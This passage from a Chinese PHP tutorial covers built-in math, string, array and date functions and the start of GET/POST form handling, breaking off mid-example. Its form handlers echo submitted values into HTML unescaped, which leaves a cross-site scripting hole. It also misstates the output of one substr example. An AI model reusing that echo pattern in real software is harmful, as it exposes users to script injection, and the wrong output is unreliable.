  \n### 第 6 章\n\n### PHP 内置函数\n\nPHP 的内置函数，也称为预定义函数或原生函数，是默认包含在 PHP 语言中的函数。它们为常见编程任务提供了广泛的现成功能，例如数学运算、字符串操作、日期和时间处理、数组管理、文件访问等。无论您是在开发动态网站、复杂的\
  \ Web 应用程序，还是任何其他 PHP 项目，这些内置函数都能让您以高效、简洁的方式完成多种任务。\n\n在本章中，我们将探索 PHP 内置函数的某些类别，并了解如何使用它们来满足各种\
  \ Web 开发需求。我们将深入研究用于执行复杂计算的数学函数、用于操作和格式化文本的字符串函数、用于管理数据集的数组函数，以及用于精确管理时间的日期和时间函数。\n\
  \n本章将让您深入了解 PHP 内置函数提供的功能，并通过实际示例说明它们在不同 Web 开发场景中的用法。准备好深入 PHP 内置函数的世界，发现它们如何简化并加速您的\
  \ Web 开发流程。\n\n#### 数学函数\n\n\n\n\n### PHP 的内置数学函数\n\nPHP 的内置数学函数提供了多种工具，用于执行常见的数学运算。从简单的计算到更高级的操作，PHP\
  \ 提供了全套函数来满足开发者的需求。在本节中，我们将探讨 PHP 中一些最常用的数学函数。\n\n#### 基础函数\n\nPHP 的基础函数为执行简单的数学运算提供了必要的工具。它们在\
  \ Web 开发中被广泛用于执行基本计算和操作数字。下表总结了一些最常用的基础函数：\n\n![Image](img/image-92.png)\n\n*  \
  \ **`abs()`**：此函数返回一个数的绝对值，即不带符号的值。例如：\n\n    ```php\n    $number = -10;\n    $absolute_value\
  \ = abs($number); // $absolute_value 为 10\n    ```\n\n*   **`sqrt()`**：`sqrt()`\
  \ 函数返回一个数的平方根。例如：\n\n    ```php\n    $number = 25;\n    $square_root = sqrt($number);\
  \ // $square_root 为 5\n    ```\n\n*   **`pow()`**：此函数返回一个数的另一个数次幂的值。例如：\n\n    ```php\n\
  \    $number = 2;\n    $power = 3;\n    $result = pow($number, $power); // $result\
  \ 为 8 (2³)\n    ```\n\n*   **`round()`**：`round()` 函数根据指定的精度将数字四舍五入到最近的小数位。示例如下：\n\
  \n    ```php\n    $number1 = 3.7;\n    $arrondi_number1 = round($number1); // $arrondi\
  \ 为 4\n    $number2 = 12.146345;\n    $arrondi_number2 = round($number2, 2); //\
  \ 将 $number2 四舍五入到 2 位小数，结果为 12.15\n    echo $arrondi_number1;\n    echo \"<br>\"\
  ;\n    echo $arrondi_number2;\n    ```\n\n    结果：\n\n    ![Image](img/image-93.png)\n\
  \n这些基础函数在许多需要对数字进行简单操作的编程场景中非常有用。它们为在 PHP 中执行基本数学计算提供了灵活性和易用性。\n\n#### 三角函数\n\n\
  在 PHP 中，集成了三角函数，以便开发者能够高效、准确地执行三角计算。下表概述了其中一些函数。\n\n![Image](img/image-94.png)\n\
  \n#### 随机函数\n\nPHP 的随机函数可用于在应用程序中生成随机数和执行随机操作。它们广泛用于游戏、模拟、随机数据生成等。以下是 PHP 中一些最常用的随机函数：\n\
  \n##### 随机数生成\n\n*   **`rand($min, $max)`**：此函数在 `$min` 和 `$max` 值之间生成一个随机数。返回的值为整数。\n\
  \n    示例：\n\n    ```php\n    $random_number = rand(1, 100);\n    echo \"1 和 100\
  \ 之间的随机数: $random_number\";\n    ```\n\n    每次运行此代码，您都会得到一个 1 到 100 之间的随机数。\n\n\
  *   **`mt_rand($min, $max)`**：类似于 `rand()`，但使用 **Mersenne Twister（梅森旋转算法）** 随机数生成器，以其更好的随机数分布而闻名。\n\
  \n    示例：\n\n    ```php\n    $random_number = mt_rand(1000, 9999);\n    echo \"\
  随机 4 位 PIN 码: $random_number\";\n    ```\n\n#### 字符串函数\n\nPHP 中的字符串函数提供了多种工具，用于高效地操作和处理字符串。以下是此类别中一些最常用的函数：\n\
  \n##### `strlen()`\n\n此函数返回字符串的长度。\n\n示例：\n\n```php\n$text = \"Hello\";\n$length\
  \ = strlen($text); // $length 为 5\necho $length;\n```\n\n结果：\n\n![Image](img/image-95.png)\n\
  \n##### `strpos()`\n\n此函数返回子字符串在字符串中首次出现的位置。\n\n示例：\n\n```php\n$text = \"Good morning\"\
  ;\n$position = strpos($text, \"mor\"); // $position 为 5\n```\n\n在本例中，我们有一个包含值 \"\
  Good morning\" 的字符串 `$text`。`strpos()` 函数用于查找子字符串 \"mor\" 在字符串 `$text` 中首次出现的位置。由于\
  \ \"mor\" 在 \"Good morning\" 中从第 5 个位置开始（索引从 0 开始），`strpos()` 函数返回值 5，即子字符串 \"mor\"\
  \ 在字符串 `$text` 中的起始位置。请注意，位置索引从零开始。字母 \"G\" 索引为 0，字母 \"o\" 索引为 1，第二个字母 \"o\" 索引为\
  \ 2，字母 \"d\" 索引为 3，空格索引为 4，字母 \"m\" 索引为 5。\n\n##### `substr()`\n\n此函数返回从指定位置和长度开始的给定字符串的子字符串。\n\
  \n示例：\n\n```php\n$text = \"Hello everyone\";\n$substring = substr($text, 3, 10);\
  \ // $substring 为 \"lo evryon\"。\necho $substring;\n```\n\n在本例中，我们有一个包含值 \" Hello\
  \ everyone\" 的字符串 `$text`。`substr()` 函数用于从 `$text` 中提取子字符串。函数的参数如下：第一个参数是原始字符串 (`$text`)，第二个参数是提取的起始位置（本例中为\
  \ 3，即从字符串 `$text` 的第 4 个字符开始，因为索引从零开始），第三个参数是要提取的子字符串的长度（本例中为 10 个字符）。因此，`substr()`\
  \ 函数从第 3 个位置开始，提取长度为 10 个字符的子字符串，得到 \"lo evryon\"。空格也算作需要考虑在内的字符。\n\n结果：\n\n![Image](img/image-96.png)\n\
  \n##### `strtoupper()` 和 `strtolower()`\n\n这些函数分别将字符串转换为大写或小写。\n\n示例：\n\n```php\n\
  $text = \"Hello everyone\";\n$upper_text = strtoupper($text); // $upper_text 为 \"\
  HELLO EVERYONE\"。\n$lower_text = strtolower($text); // $lower_text 为 \"hello everyone\"\
  。\necho $upper_text;\necho \"<br>\";\necho $lower_text;\n```\n\n![Image](img/image-97.png)\n\
  \n##### `str_replace()`\n\n此函数用另一个子字符串替换字符串中所有出现的指定子字符串。\n\n示例：\n\n```php\n$text\
  \ = \"Hello everyone\";\n$new_text = str_replace(\"everyone\", \"friends\", $text);\n\
  echo $new_text;\n```\n\n在此代码中，`str_replace()` 函数将字符串 `$text` 中的 \"everyone\" 替换为\
  \ \"friends\"。如果您运行此代码，将得到以下结果：\n\n![Image](img/image-98.png)\n\n简而言之，这些函数只是 PHP\
  \ 中可用于高效灵活地操作字符串的众多函数中的几个例子。\n\n#### 数组函数\n\n数组操作是 PHP 中的常见任务，语言提供的内置函数使其变得更加容易。以下是用于处理数组的一些最常用函数：\n\
  \n| 函数 | 含义 |\n| --- | --- |\n| `count()` | 计算数组中的元素数量 |\n| `sort()` | 按升序对数组进行排序\
  \ |\n| `rsort()` | 按降序对数组进行排序 |\n| `array_push()` | 将一个或多个元素添加到数组末尾 |\n| `array_unshift()`\
  \ | 将一个或多个元素添加到数组开头 |\n| `array_pop()` | 删除数组的最后一个元素 |\n| `array_shift()` | 删除数组的第一个元素\
  \ |\n| `array_slice()` | 提取数组的一部分 |\n| `array_merge()` | 合并一个或多个数组 |\n| `array_key_exists()`\
  \ | 检查键是否存在于数组中 |\n| `in_array()` | 检查给定值是否存在于数组中 |\n| `array_search()` | 在数组中搜索给定值并返回对应的键\
  \ |\n| `array_replace()` | 用一个或多个其他数组的元素替换数组的元素 |\n\n##### `sort()` 函数\n\n`sort()`\
  \ 函数按值的升序对数组进行排序。它直接就地修改数组，并返回一个布尔值指示操作是否成功。示例如下：\n\n```php\n$fruits = [\"orange\"\
  , \"apple\", \"banana\", \"strawberry\"];\nsort($fruits);\necho \"<pre>\";\nprint_r($fruits);\n\
  echo \"</pre>\";\n```\n\n在本例中，`$fruits` 数组按升序排序，结果如下：\n\n![Image](img/image-99.png)\n\
  \n\n\n\n\n### PHP 数组与日期时间函数\n\n#### 数组操作函数\n\n##### `array_push()`\n`array_push()`\
  \ 函数用于向数组末尾添加一个或多个元素。它直接修改原数组并返回新的元素总数。\n\n示例：\n```php\n<?php\n$fruits = [\"orange\"\
  , \"apple\", \"banana\", \"strawberry\"];\narray_push($fruits, \"Pineapple\", \"\
  kiwi\");\necho \"<pre>\";\nprint_r($fruits);\necho \"</pre>\";\n?>\n```\n此例中，\"\
  Pineapple\" 和 \"Kiwi\" 被追加到 `$fruits` 数组末尾。\n\n![Image](img/image-100.png)\n\n#####\
  \ `array_pop()`\n`array_pop()` 函数删除数组的最后一个元素并返回该元素。它直接修改当前数组。\n\n示例：\n```php\n<?php\n\
  $fruits = [\"orange\", \"apple\", \"banana\", \"strawberry\"];\n$last_fruit = array_pop($fruits);\n\
  echo \"The last fruit was: \" . $last_fruit . \"<br>\";\necho \"<pre>\";\nprint_r($fruits);\n\
  echo \"</pre>\";\n?>\n```\n此例中，`array_pop()` 删除了 `$fruits` 数组的最后一个元素 \"strawberry\"\
  。变量 `$last_fruit` 现在包含值 \"strawberry\"，`$fruits` 数组被修改如下：\n\n![Image](img/image-101.png)\n\
  \n##### `array_slice()`\n`array_slice()` 函数根据指定参数返回数组的指定部分。它不修改原数组，而是返回一个包含选定元素的新数组。\n\
  \n**语法：**\n![Image](img/image-102.png)\n\n参数说明：\n- `$array`：要从中提取部分的原始数组。\n- `$start`：开始提取元素的起始索引。\n\
  - `$length`：要提取的元素数量。如果省略，则包含从 `$start` 开始的所有元素。\n- `$preserve_keys`：布尔值，指示是否在结果数组中保留关联键。默认情况下，键从零开始重新索引。\n\
  \n示例：\n```php\n<?php\n$fruits = [\"apple\", \"banana\", \"orange\", \"strawberry\"\
  , \"pineapple\"];\n$portion = array_slice($fruits, 1, 3);\necho \"<pre>\";\nprint_r($portion);\n\
  echo \"</pre>\";\n?>\n```\n此例从索引 1（第二个元素 \"banana\"）开始提取 `$fruits` 数组的部分，包含接下来的三个元素。生成的数组\
  \ `$portion` 将包含 \"banana\"、\"orange\" 和 \"strawberry\"。注意原始 `$fruits` 数组未被修改。如果不指定提取的元素数量，则会提取从\
  \ `$start` 开始的所有元素。\n\n![Image](img/image-103.png)\n\n##### `array_merge()`\n`array_merge()`\
  \ 函数用于将两个或多个数组合并为一个数组。它接受作为参数的数组并返回一个包含所有源数组元素的新数组。\n\n**语法：**\n![Image](img/image-104.png)\n\
  \n参数：\n- `$tab1, $tab2, … $tabn`：要合并的数组。可提供多个用逗号分隔的数组。\n\n示例：\n```php\n<?php\n$tab1\
  \ = [\"a\" => \"apple\", \"b\" => \"banana\"];\n$tab2 = [\"c\" => \"orange\", \"\
  d\" => \"strawberry\"];\n$tab3 = [\"e\" => \"ananas\"];\n$result = array_merge($tab1,\
  \ $tab2, $tab3);\necho \"<pre>\";\nprint_r($result);\necho \"</pre>\";\n?>\n```\n\
  此例中，`array_merge()` 将 `$tab1`、`$tab2` 和 `$tab3` 合并为单个数组 `$result`。合并后的数组将包含所有源数组的元素，唯一键将被保留，否则键将从零开始重新索引。\n\
  \n![Image](img/image-105.png)\n\n##### `array_key_exists()`\n`array_key_exists()`\
  \ 函数用于检查特定键是否存在于给定数组中。如果键存在则返回 `true`，否则返回 `false`。\n\n**语法：**\n![Image](img/image-106.png)\n\
  \n参数：\n- `key`：要在数组中搜索的键。\n- `$tab`：要在其中搜索键的数组。\n\n示例：\n```php\n<?php\n$person =\
  \ [\n    \"lastname\" => \"Dupont\",\n    \"firstname\" => \"John\",\n    \"age\"\
  \ => 30\n];\n\nif (array_key_exists(\"firstname\", $person)) {\n    echo \"The key\
  \ 'firstname' exists in the array person.\";\n} else {\n    echo \"The key 'firstname'\
  \ does not exist in the array person.\";\n}\n?>\n```\n此例中，`array_key_exists()` 检查键\
  \ \"firstname\" 是否存在于 `$person` 数组中。由于该键存在，条件为真，显示消息 \"The key 'firstname' exists\
  \ in the array person.\"。\n\n##### `array_replace()`\n`array_replace()` 函数用于用一个或多个其他数组的元素替换数组的元素。它用替换数组中对应的值替换第一个数组中现有的键值，并添加不存在的键。\n\
  \n**语法：**\n![Image](img/image-107.png)\n\n参数：\n- `$tab1`：要替换其元素的数组。\n- `$tab2, $Other_arrays`：替换数组。可根据需要指定任意数量的数组。\n\
  \n该函数返回一个包含更新后元素的新数组。\n\n示例：\n```php\n<?php\n$array1 = [\"a\" => \"red\", \"b\"\
  \ => \"green\", \"c\" => \"blue\"];\n$array2 = [\"b\" => \"yellow\", \"d\" => \"\
  orange\"];\n$new_array = array_replace($array1, $array2);\necho \"<pre>\";\nprint_r($new_array);\n\
  echo \"</pre>\";\n?>\n```\n此例中，`$array1` 数组被 `$array2` 数组中的值替换。`$array1` 和 `$array2`\
  \ 都存在键 \"b\"，因此 `$new_array` 中键 \"b\" 的值将被 `$array2` 的值替换。键 \"a\"、\"c\" 和 \"d\"\
  \ 仅存在于其中一个数组中，因此它们将被添加到 `$new_array` 中。\n\n![Image](img/image-108.png)\n\n#### 日期和时间函数\n\
  \nPHP 中有许多内置函数便于日期和时间的操作。这些函数可用于格式化日期、对日期执行算术运算、计算两个日期之间的差值等。\n\n以下是一些最常用的日期和时间处理函数：\n\
  \n##### `date(format, timestamp)`\n`date(format, timestamp)` 函数返回一个表示当前日期和时间或由时间戳指定的日期和时间的格式化字符串。`format`\
  \ 参数定义输出字符串的格式，而 `timestamp` 参数（可选）指定用作转换基础的 Unix 时间戳。如果未提供 `timestamp` 参数，函数将使用当前时间戳。\n\
  \n示例：\n```php\n<?php\n// 以 \"d-m-Y H:i:s\" 格式获取当前日期\n$currentDate = date(\"d-m-Y\
  \ H:i:s\");\necho $currentDate . \"<br>\";\n// 以 \"d/m/Y\" 格式获取当前日期\n$currentDate2\
  \ = date(\"d/m/Y\");\necho $currentDate2 . \"<br>\";\n?>\n```\n在这些示例中，`date()` 函数用于格式化当前日期。运行此代码将得到类似以下的结果：\n\
  \n![Image](img/image-109.png)\n\n##### `getdate()`\n`getdate()` 函数返回一个包含当前日期信息的关联数组。\n\
  \n示例：\n```php\n<?php\n$currentdate = getdate();\necho \"<pre>\";\nprint_r($currentdate);\n\
  echo \"</pre>\";\n?>\n```\n此代码返回一个包含当前日期的年、月、日等元素的关联数组。\n\n![Image](img/image-110.png)\n\
  \n返回数组包含以下键：\n- `\"seconds\"`：当前秒数（0 到 59）\n- `\"minutes\"`：当前分钟数（0 到 59）\n- `\"\
  hours\"`：24 小时制的当前小时数（0 到 23）\n- `\"mday\"`：当月的第几天（1 到 31）\n- `\"wday\"`：一周中的第几天（0\
  \ 表示周日，6 表示周六）\n- `\"mon\"`：当前月份（1 到 12）\n- `\"year\"`：完整格式的当前年份（例如 2024）\n- `\"\
  yday\"`：一年中的第几天（0 到 365）\n- `\"weekday\"`：当前星期几的完整名称（例如 \"Monday\"）\n\n\n\n\n* \
  \  `month`：当前月份的全称（例如 \"February\"）\n*   `0`：表示当前日期的 Unix 时间戳\n\n这些元素提供了当前日期和时间的精确细节。\n\
  \n*   PHP 的 `time()` 函数返回自 1970 年 1 月 1 日午夜 UTC（Unix 时间）以来经过的秒数。它不接受任何参数。\n\n示例：\n\
  \n```php\n$current_time = time();\necho \"The time in seconds since the Unix epoch:\
  \ $current_time\";\n```\n\n运行此代码将返回自 01/01/1970 以来的当前时间（以秒为单位）：\n\n![Image](img/image-111.png)\n\
  \n此函数常用于测量持续时间、计算时间间隔或进行其他基于时间的操作。\n\n*   PHP 中的 **`strtotime()` 函数** 用于将文本日期解析为\
  \ Unix 时间戳值，表示自 1970 年 1 月 1 日 00:00:00 UTC（Unix 时间）以来经过的秒数。以下是其用法的一些示例：\n\n```php\n\
  $date_text = \"2023-08-29\";\n$timestamp = strtotime($date_text);\necho \"The timestamp\
  \ for the date $date_text is: $timestamp\";\n```\n\n此代码将产生类似以下的结果：\n\n![Image](img/image-112.png)\n\
  \n计算两个特定日期之间时间的示例：\n\n您可以使用 `strtotime()` 函数获取这些日期的时间戳，然后减去相应的时间戳以获得以秒为单位的差值。然后您可以根据需要将此差值转换为天、小时、分钟等。\n\
  \n以下是计算 02/15/1996 和 08/29/2024 之间持续时间的示例：\n\n```php\n// 开始日期的时间戳 (02/15/1996 00:00:00)\n\
  $departure_date = strtotime(\"1996-02-15\");\n// 到达日期的时间戳 (29/08/2024 00:00:00)\n\
  $arrival_date = strtotime(\"2024-08-29\");\n// 计算以秒为单位的差值\n$difference_seconds =\
  \ $arrival_date - $departure_date;\n// 显示以秒为单位的持续时间\necho \"Duration in seconds\
  \ between 02-15-1996 and 08-29-2024: $difference_seconds\";\n```\n\n此代码将产生类似以下的结果：\n\
  \n![Image](img/image-113.png)\n\n#### 结论\n\n重要的是要注意，PHP 提供了大量预定义函数来完成多种任务，从数学运算和字符串操作到数组操作以及日期/时间管理等。要在一本书中详尽涵盖所有这些函数是不可能的。\n\
  \n本章的目的是为您提供 PHP 内置不同函数类别的代表性示例，以便您了解它们的基本用法和操作。必须注意的是，目的不是让您死记硬背所有函数，而是让您熟悉它们的存在和实用性。\n\
  \n作为开发人员，培养在需要使用特定函数时搜索和查阅 PHP 官方文档或其他在线资源的能力至关重要。这是软件开发过程不可或缺的一部分，将使您能够自行探索 PHP\
  \ 语言提供的特性和可能性。\n\n### B 部分\n\n### 高级数据管理与浏览器交互\n\n在本部分中，我们将探讨数据操作和浏览器交互的高级方面。我们将深入研究高级技术，使您能够创建更动态、更具交互性的\
  \ Web 应用程序。\n\n**第 7 章**：本章我们将介绍使用 GET 和 POST 方法处理来自浏览器的数据。我们将学习如何从表单检索数据，并在 PHP\
  \ 脚本中使用这些数据，以在 Web 应用程序中创建交互功能。\n\n**第 8 章：** 图像与文件：本章重点介绍 Web 应用程序中图像和文件等多媒体资源的管理。它探讨了在服务器端存储、加载和操作图像及文件的最佳实践。\n\
  \n**第 9 章：** 会话与 Cookie 管理：本章探讨 Web 应用程序中用户会话状态的管理机制。它详细介绍了使用 Cookie 存储客户端信息，以及服务器端会话管理技术。\n\
  \n### 第 7 章\n\n### 浏览器数据处理 (GET, POST)\n\n到目前为止，我们已经探讨了许多构成我们未来学习基础的基本概念。如果这是您第一次涉足服务端编程，起初感到有些迷茫是正常的。您也可能无法完全掌握变量、条件、循环、函数、数组等的用处。这是可以理解的，因为到目前为止，我们主要使用的是自己定义的值。换句话说，在示例中，我们用预定值初始化了变量。\n\
  \n然而，在后续课程中，我们将使用那些我们不预先自行定义值的变量。例如，我们将学习如何检索用户通过表单输入的信息，届时您将完全理解我们迄今所学内容的重要性。\n\
  \n本书的这一章重点介绍来自浏览器的数据处理，特别强调 GET 和 POST 方法。当我们与网站交互时，经常会传输信息，如表单参数或 URL 标识符。这些数据对于个性化用户体验、执行搜索或管理用户会话等至关重要。\n\
  \n本章将为您提供在 PHP 项目中有效操作浏览器数据所需的知识，为创建更动态、更具交互性的 Web 应用程序铺平道路。\n\n#### 在 PHP 中传输和处理表单数据\n\
  \n要检索用户在表单中输入的数据，主要有两种方法：\n\n第一种方法是创建两个单独的文件：一个包含表单的 HTML 文件，和一个负责处理该表单提交数据的 PHP\
  \ 文件。\n\n第二种方法是将 HTML 表单代码和 PHP 处理代码结合在一个 PHP 文件中。\n\n最初，我们将专注于第一种配置，即使用两个单独的文件。第一个文件（例如命名为\
  \ `form.php`）将包含表单，而第二个文件（例如命名为 `processingform.php`）将负责处理该表单传输的数据。\n\n![Image](img/image-114.png)\n\
  \n在 `ebbokphp` 目录中，创建这两个文件：\n\n![Image](img/image-115.png)\n\n##### 创建表单\n\n让我们在\
  \ `form.php` 文件中创建一个表单：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\
  <meta charset=\"UTF-8\">\n<title>Form </title>\n</head>\n<body>\n<form action=\"\
  processingform.php\" method=\"post\">\n <fieldset>\n <legend>Personal information:</legend>\n\
  \ <label for=\"lastname\">Last Name:</label><br>\n <input type=\"text\" id=\"lastname\"\
  \ name=\"lastname\"><br>\n <label for=\"firstname\">First Name:</label><br>\n <input\
  \ type=\"text\" id=\"firstname\" name=\"firstname\"><br>\n <label for=\"email\"\
  >Email address:</label><br>\n <input type=\"email\" id=\"email\" name=\"email\"\
  ><br>\n <label for=\"country\">Country:</label><br>\n <select id=\"country\" name=\"\
  country\">\n <option value=\"France\">France</option>\n <option value=\"Morocco\"\
  >Morocco</option>\n <option value=\"Spain\">Spain</option>\n <option value=\"Canada\"\
  >Canada</option>\n <option value=\"Belgium\">Belgium</option>\n </select><br><br>\n\
  \ <input type=\"submit\" value=\"Send\">\n </fieldset>\n </form>\n</body>\n</html>\n\
  ```\n\n该表单设计了一个标题为 \"Personal information\" 的 `fieldset`，并包含以下字段：\"Last name\"、\"\
  First name\"、\"Email address\" 和 \"Country\"。\n\n**Input** 字段是用于输入用户数据的表单元素。`type`\
  \ 属性定义字段类型，例如 \"text\" 用于 \"Last name\" 和 \"First name\" 等文本字段，\"email\" 用于电子邮件地址字段。`id`\
  \ 属性用于关联相应的标签，而 `name` 属性对于在表单提交时识别字段数据至关重要。\n\n\n\n\n\n`<select>` 和 `<option>`\
  \ 元素用于创建下拉列表。`<select>` 标签创建一个下拉列表，而 `<option>` 标签定义列表中的每个选项。每个选项的 `value` 属性是在选择时发送给服务器的值。\n\
  \n`<input type=\"submit\">` 按钮允许用户提交表单。`value` 属性定义按钮上显示的文本，在本例中为 \"Submit\"。\n\n\
  `<form>` 标签包裹表单的所有元素。`action` 属性指定数据处理脚本的 URL（在本例中为 \"processingform.php\"），而 `method`\
  \ 属性定义发送数据所使用的 HTTP 方法（此处为 POST）。\n\n要检索从 HTML 表单发送的数据，PHP 提供了两种方法：`GET` 和 `POST`，可通过超全局变量\
  \ `$_GET` 和 `$_POST` 访问。这些超全局变量用于检索表单字段的值，稍后我们将看到具体用法。\n\n![Image](img/image-116.png)\n\
  \n##### 在 PHP 中使用 POST 方法检索数据\n\n在 `form.php` 文件中创建表单后，检索传输数据的过程如下：\n\n当用户点击“发送”按钮提交表单时，数据被发送到服务器。\n\
  \n服务器接收数据并将其传输到表单 `action` 属性中指定的处理文件（在本例中为 \"processingform.php\"）。\n\n在 `processingform.php`\
  \ 文件中，我们根据表单中使用的方法（在本例中为 POST），通过 `$_GET` 或 `$_POST` 超全局变量检索传输的数据。\n\n然后，我们根据应用程序的需求处理这些数据，例如验证、操作、存储到数据库等。\n\
  \n下面是文件 `processingform.php` 的代码示例，假设表单使用 POST 方法发送数据：\n\n```php\n<?php\n\n // 检索表单数据\n\
  \n $lastname = $_POST[\"lastname\"];\n\n $firstname = $_POST[\"firstname\"];\n\n\
  \ $email = $_POST[\"email\"];\n\n $country = $_POST[\"country\"];\n\n // 数据处理示例（显示）\n\
  \n echo \"Last Name : \" . $lastname . \"<br>\";\n\n echo \"First Name : \" . $firstname\
  \ . \"<br>\";\n\n echo \"Email : \" . $email . \"<br>\";\n\n echo \"Country : \"\
  \ . $country . \"<br>\";\n\n?>\n```\n\n在该代码中，`$lastname`、`$firstname`、`$email` 和\
  \ `$country` 等变量用于存储在表单字段中输入的值。每个变量都与 `$_POST` 超全局变量中的特定键相关联，该键对应表单字段的 `name` 属性。\n\
  \n通过与表单字段关联的键从 `$_POST` 超全局变量中检索数据。例如，`$_POST[\"lastname\"]` 检索 `name` 属性等于 \"lastname\"\
  \ 的字段的值。\n\n检索数据后，根据应用程序的需求对其进行处理或显示。在本例中，数据仅使用 `echo` 函数显示在屏幕上。\n\n每个表单字段都会连同其对应的标签一起显示，以便于阅读和理解用户输入的数据。\n\
  \n简而言之，这段 PHP 代码检索通过 HTML 表单提交的数据，将其存储在适当的变量中，并在屏幕上显示，用于演示或进一步处理。\n\n要测试此代码，只需在\
  \ `form.php` 文件中填写表单，然后点击“发送”按钮进行验证。您将获得类似以下的结果：\n\n![Image](img/image-117.png)\n\
  \n> **警告**\n>\n> 如果您尝试直接访问 `processingform.php` 文件，将会得到类似以下的错误：\n>\n> ![Image](img/image-118.png)\n\
  \n事实上，当您尝试直接访问文件 `processingform.php`，而不通过发送 POST 数据的表单时，就会出现此类错误。这是因为 `processingform.php`\
  \ 中的 PHP 代码尝试从 `$_POST` 超全局变量访问表单字段值，但由于直接访问文件时这些值未通过 POST 发送，PHP 无法在 `$_POST` 中找到它们。\n\
  \n换句话说，当您直接访问 `processingform.php` 时，没有通过 POST 发送的数据，因此 \"last name\"、\"first name\"\
  、\"email\" 和 \"country\" 等索引不存在于 `$_POST` 超全局变量中。结果，当 PHP 尝试访问这些不存在的索引时，会生成错误。\n\
  \n为了避免这些错误，重要的是在尝试检索数据之前添加测试，以检查数据是否在 `$_POST` 中可用。让我们按如下方式修改文件 `processingform.php`\
  \ 中的代码：\n\n```php\n<?php\n\n // 检查是否通过 POST 发送了数据\n\n if ($_SERVER[\"REQUEST_METHOD\"\
  ] == \"POST\") {\n\n // 检索表单数据\n\n $name = $_POST[\"lastname\"];\n\n $firstname\
  \ = $_POST[\"firstname\"];\n\n $email = $_POST[\"email\"];\n\n $country = $_POST[\"\
  country\"];\n\n // 数据处理示例（显示）\n\n echo \"Name : \" . $name . \"<br>\";\n\n echo\
  \ \"First name : \" . $firstname . \"<br>\";\n\n echo \"Email : \" . $email . \"\
  <br>\";\n\n echo \"Country : \" . $country . \"<br>\";\n\n }else{\n\n // 如果请求方法不是\
  \ POST，则显示错误消息\n\n echo \"Error: Access not authorized.\";\n\n }\n\n?>\n```\n\n\
  通过这种方法，您首先使用 `$_SERVER[\"REQUEST_METHOD\"] == \"POST\"` 检查是否通过 POST 发送了数据。如果请求方法不是\
  \ POST，则可以显示适当的错误消息以通知用户。\n\n换句话说，如果您尝试直接访问 `processingform.php` 文件，将会得到 `else`\
  \ 块中显示的消息；否则，如果您通过 `form.php` 文件中的表单访问，将会显示输入的数据。\n\n例如：\n\n![Image](img/image-119.png)\n\
  \n我们可以通过执行预检查来进一步优化代码，以确保所有预期数据都在 `$_POST` 变量中可用。例如，我们可以检查所有必填字段是否已填写，以及 email 字段是否包含符合电子邮件地址标准的有效电子邮件地址（特别是通过检查\
  \ \"@\" 符号的存在）。这将提高我们处理表单输入数据的健壮性和可靠性。以下是更新后的代码：\n\n```php\n<?php\n\n // 检查是否通过\
  \ POST 发送了数据\n\n if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {\n\n // 检查预期数据是否在\
  \ $_POST 中可用\n\n if (empty($_POST[\"lastname\"])) {\n\n echo \"Please enter your\
  \ last name!\";\n\n } elseif (empty($_POST[\"firstname\"])) {\n\n echo \"Please\
  \ enter your first name!\";\n\n } elseif (empty($_POST[\"email\"]) || !filter_var($_POST[\"\
  email\"], FILTER_VALIDATE_EMAIL)) {\n\n echo \"Please enter a valid email!\";\n\n\
  \ } elseif (empty($_POST[\"country\"])) {\n\n echo \"Please select your country!\"\
  ;\n\n } else {\n\n // 检索表单数据\n\n $lastname = $_POST[\"lastname\"];\n\n $firstname\
  \ = $_POST[\"firstname\"];\n\n $email = $_POST[\"email\"];\n\n $country = $_POST[\"\
  country\"];\n\n // 数据处理示例（显示）\n\n echo \"Last Name : \" . $lastname . \"<br>\";\n\
  \n echo \"First Name : \" . $firstname . \"<br>\";\n\n echo \"Email : \" . $email\
  \ . \"<br>\";\n\n echo \"Country : \" . $country . \"<br>\";\n\n }\n\n } else {\n\
  \n// 如果请求方法不是 POST，则显示错误消息\n\n echo \"Error: Access not authorized\";\n\n }\n\n\
  ?>\n```\n\n这段 PHP 代码首先通过检查 `$_SERVER[\"REQUEST_METHOD\"]` 的值来确认是否通过 POST 方法发送了数据。然后检查预期数据是否在\
  \ `$_POST` 中可用。如果不满足以下任一条件，将显示相应的错误消息：\n\n*   如果 \"last name\" 字段为空，则显示消息 \"Please\
  \ enter your last name!\"。\n*   如果 \"first name\" 字段为空，则显示消息 \"Please enter your\
  \ first name!\"。\n*   如果 \"email\" 字段为空或不包含有效的电子邮件地址（使用 `FILTER_VALIDATE_EMAIL`\
  \ 检查），则显示消息 \"Please enter a valid email!\"。\n*   如果 \"country\" 字段为空，则显示消息 \"Please\
  \ choose your country!\"。\n\n\n\n\n如果满足所有条件，即所有必填字段均已填写且电子邮件地址有效，则从变量 `$lastname`、`$firstname`、`$email`\
  \ 和 `$country` 中获取表单数据。最后，执行一个数据处理示例，出于演示目的显示这些变量的值。\n\n如果请求方法不是 POST，即数据未通过表单提交，则显示“Error:\
  \ Access not authorized”（错误：未授权访问）错误消息。\n\n请注意，PHP 中的 `filter_var` 函数用于使用特定过滤器过滤变量。它接受两个参数：要过滤的变量和要应用的过滤器。\n\
  \n在此示例中，`FILTER_VALIDATE_EMAIL` 用作过滤器，用于检查变量是否包含有效的电子邮件地址。此过滤器旨在根据标准格式规范验证电子邮件地址。如果变量不包含有效的电子邮件地址，`filter_var`\
  \ 函数返回 false，否则返回该电子邮件地址。\n\n总之，`filter_var($_POST[\"email\"], FILTER_VALIDATE_EMAIL)`\
  \ 检查变量 `$_POST[\"email\"]` 是否根据标准格式标准包含有效的电子邮件地址。如果是，则返回该电子邮件地址，否则返回 false。\n\n\
  #### 在 PHP 中使用 GET 方法检索数据\n\nGET 方法常用于将表单数据发送到 PHP 脚本，方法是将数据附加到 URL 后面，特别是在数据不敏感且不包含机密信息时。此数据在浏览器\
  \ URL 中可见，可在服务器端检索和处理。\n\n要在 PHP 中检索通过 GET 方法发送的数据，我们使用 `$_GET` 超全局变量。此超全局变量包含一个关联数组，存放\
  \ URL 中传递的参数。参数使用 URL 中定义的名称进行检索。\n\n我们将探讨如何使用 `$_GET` 检索 URL 参数值，以及如何在 PHP 脚本中使用它们执行各种操作。\n\
  \n为此，我们回到前面的示例。在 `form.php` 文件中，将 method 属性的 \"post\" 方法替换为 \"get\"。在 `processingform.php`\
  \ 中，将所有 `$_POST` 出现替换为 `$_GET`。\n\n##### form.php\n\n```php\n<?php\n\n // 检查是否已通过\
